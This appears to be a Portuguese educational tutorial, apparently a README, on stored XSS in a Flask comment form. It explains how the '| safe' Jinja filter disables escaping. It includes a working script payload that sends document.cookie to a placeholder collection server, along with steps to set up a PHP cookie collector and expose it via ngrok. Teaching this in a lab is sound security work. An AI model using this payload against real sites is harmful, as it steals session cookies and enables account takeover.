# Estudo de Caso: Vulnerabilidade em Formulário de Comentários

# Cenário:

Imagine uma aplicação de blog simples que permite aos usuários postar comentários em artigos. O formulário de comentários tem um campo de texto para o nome do usuário e outro para o conteúdo do comentário. O código do servidor recebe esses dados e os insere diretamente em uma página HTML que é exibida para outros usuários, sem qualquer tipo de validação ou sanitização.

Para executar o estudo de caso de vulnerabilidade em formulários de comentários e demonstrar o ataque de XSS persistente, você precisará simular o ambiente de uma aplicação web vulnerável.

A vulnerabilidade ocorre quando a aplicação não sanitiza a entrada do usuário antes de armazená-la no banco de dados e exibi-la para outros usuários.

# Passo 1: Simulação da Aplicação Vulnerável

Primeiro, você precisa de um código de servidor simples que tenha a vulnerabilidade. Usarei um exemplo em Python com o framework Flask, que é fácil de configurar.

Código Python (app.py):

Observação sobre a vulnerabilidade: A linha {{ comment | safe }} no template é intencionalmente vulnerável. O filtro | safe no Jinja2 (motor de template do Flask) desabilita a sanitização automática, fazendo com que o HTML injetado seja renderizado.

# Passo 2: Configurando o Servidor de Coleta de Cookies

Para demonstrar o roubo de cookies, você precisa de um servidor que "colete" as requisições maliciosas. Rodar o arquivo .php em um servidor Web (Ex.: Apache)

Código PHP (coletar_cookie.php):

Este script simplesmente pega o valor do cookie da URL e o salva em um arquivo de texto no servidor.

# Passo 3: Execução do Ataque

Com os dois servidores prontos, siga os passos abaixo para realizar o ataque:

Inicie o servidor da aplicação vulnerável: Execute python app.py no seu terminal. Ele estará rodando em http://127.0.0.1:5000.

Inicie o servidor de coleta de cookies: Coloque o arquivo coletar_cookie.php em um servidor web (como Apache ou Nginx) ou use uma ferramenta de tunelamento como o ngrok para expor seu servidor local à internet. Anote a URL.

Acesse a página vulnerável em http://127.0.0.1:5000.

Crie a carga maliciosa: No campo de comentário, insira o seguinte script. Substitua http://seu-servidor-de-coleta.com pela URL do seu servidor Flask.

HTML
<script>
    document.write('<img src="http://seu-servidor-de-coleta.com/coletar_cookie.php?cookie=' + document.cookie + '">');
</script>

Envie o comentário: Clique em "Enviar". A página irá recarregar e exibir a mensagem de sucesso.

Verifique o ataque: Volte para a página inicial da aplicação (http://127.0.0.1:5000). O navegador, ao renderizar o comentário, executará o script. Ele tentará carregar a imagem, o que fará uma requisição GET para o seu servidor de coleta, enviando o cookie.

Confirme o sucesso: Verifique o seu servidor de coleta. O arquivo cookies_roubados.txt deve ter sido criado e conter o cookie roubado.








# Código Vulnerável (Exemplo Simplificado em Python com Flask):




### Código em Python ### 
formulario.py

# O Ataque:

Um atacante, ciente de que o código não valida a entrada, pode usar o campo de comentário para injetar um código malicioso. Em vez de escrever um comentário normal, ele pode inserir um script JavaScript:

Conteúdo do Comentário do Atacante:

###  Código em HTML - Inserir esse código dentro do formulário ### 
ataque.html 

# Resultado:

Quando o comentário é postado e outro usuário acessa a página para ler os comentários, o navegador desse usuário interpretará a string injetada como um script JavaScript. O script será executado no contexto da página do blog, que é um ambiente confiável para o navegador. O script malicioso, então, roubará os cookies de sessão do usuário (que podem conter informações de autenticação) e os enviará para o servidor do atacante. O atacante pode usar esses cookies para se passar pelo usuário e obter acesso não autorizado à sua conta.

# COMO EXECUTAR - Sugestão - Utiizar ambiente Linux

1 - Necessário python instalado máquina
2- Instalar a biblioteca Flask -  pip install Flask
3 - Executar o arquivo em python - python3 formulario.py

(base) alex@iMac-de-Alex example_01 % python3 formulario.py
 * Serving Flask app 'formulario'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 647-019-061

A Bilbioteca Flask é um framework WSGI leve para aplicações web. Ele foi projetado para tornar os primeiros passos rápidos e fáceis, com capacidade de expansão para aplicações complexas. Comece com a Instalação e, em seguida, obtenha uma visão geral com o Início Rápido .

4 - Abrir o browser na página http://127.0.0.1:5000